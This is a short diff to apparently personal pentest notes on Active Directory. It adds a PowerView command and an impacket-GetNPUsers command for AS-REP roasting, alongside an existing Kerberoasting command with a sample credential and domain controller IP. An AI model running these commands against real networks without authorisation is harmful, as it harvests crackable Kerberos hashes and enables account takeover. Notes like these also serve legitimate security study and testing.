@@ -15,3 +15,13 @@ impacket-GetUserSPNs xyz.com/alice:bubbles -dc-ip 192.168.111.155 -request
 
 *Ticket Granting Ticket (TGT)*
 
+### List vuln users using PowerView
+
+```
+Get-DomainUser -PreauthNotRequired -verbose
+```
+
+```
+impacket-GetNPUsers $domain-name/ -dc-ip $ip -usersfile usernames.txt
+```
+
